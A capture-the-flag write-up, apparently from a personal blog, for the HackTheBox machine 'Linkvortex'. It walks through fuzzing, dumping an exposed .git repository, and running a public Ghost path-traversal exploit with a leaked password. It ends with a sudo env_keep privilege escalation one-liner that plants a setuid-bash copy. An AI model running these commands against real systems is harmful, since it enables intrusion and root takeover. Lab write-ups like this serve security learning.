---
layout: post
title: "Linkvortex"
date: 2024-12-28
categories: hackthebox
---


```
sudo nmap -sC -sV -p- 10.10.11.47 -T4 -oN nmap
```

just web 


### Vhosts Fuzzing

```bash
ffuf -u http://linkvortex.htb  -H "Host: FUZZ.linkvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 301
```

![[Pasted image 20241223182105.png]]

### Directory Fuzzing

the `wordlist I usually use didn't catch anything /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  but  /usr/share/seclists/Discovery/Web-Content/common.txt got me some juicy directories`

```bash
ffuf -u http://dev.linkvortex.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![[Pasted image 20241223182412.png]]

`.git` directory I will use `git-dumper to dump all the files`

### Git dumper

```bash
python3 -m venv lol ; source lol/bin/activate
pip3 install git-dumper
```


```bash
git-dumper  http://dev.linkvortex.htb/.git   git-vortex
```


### GIT enumerate

I start enumerating the git directory and I checked the `diff` between the current and the commit before that 

```bash
git diff 
```

![[Pasted image 20241223183804.png]]

### foothold the main web

![[Pasted image 20241223184720.png]]

this version of `Ghost` is vulnerable to path traversal https://github.com/0xyassine/CVE-2023-40028/tree/master


```bash
./CVE-2023-40028 -u 'admin@linkvortex.htb' -p 'OctopiFociPilfer45'
```


and we got a prompt we can use it to read file , from the diff of commit , I notice an interesting file
`/var/lib/ghost/config.production.json`
![[Pasted image 20241223185534.png]]`


ssh into user

### root

```bash
sudo -l

Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```


scripts

```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

`the script first check if the CHECK_CONTENT is a non empty string , then follow the symlink and remove the extenstion if something critical is found in this part the script will stip else move the png file to the /var/quarantined `

the trick here is we control the value of `CHECK_CONTENT` so if we set a malicious script it will be ran in this if 

```bash
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
```

in order to reach that we need to get in the first if we can do that by setting a symbolic link , then running the script as `sudo` and abusing the `env_keep` to setting our malicious script at `CHECK_CONTENT`


```bash
touch image.png ; ln -s image.png link.png ; echo 'cp /bin/bash /home/bob/exploit && chmod 4777 /home/bob/exploit' > /tmp/trick ; chmod +x /tmp/trick ; export CHECK_CONTENT=/tmp/trick ; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh link.png ; /home/bob/exploit -p
```
